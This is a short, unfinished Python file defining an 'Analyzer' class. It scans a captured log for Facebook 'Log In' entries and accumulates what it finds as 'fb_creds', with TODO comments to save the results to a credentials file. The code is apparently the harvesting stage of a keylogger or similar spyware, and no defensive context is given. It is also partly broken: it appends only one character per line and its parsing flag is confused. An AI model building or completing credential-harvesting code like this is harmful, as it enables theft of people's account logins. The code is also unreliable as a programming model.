# TODO: write to cred file
class Analyzer:
    def __init__(self, log_file, cred_file):
        # arguments
        self.log_file = log_file
        self.cred_file = cred_file
        
        # other properties
        self.got_fb_creds = False
        self.fb_creds = ""
    
    def parse_log_file(self):
        will_not_parse = self.got_fb_creds # AND *_cred vars
        if will_not_parse:
            return will_not_parse
        else:
            fd = open(self.log_file, 'r')
            if(not self.got_fb_creds):
                for msg in fd:
                    if(('Facebook' in msg)):
                        if('Log In' in msg):
                            self.fb_creds += msg[1]
                        else:
                            self.got_fb_creds= True
                            # TODO: add to cred file
            fd.close()
            return will_not_parse
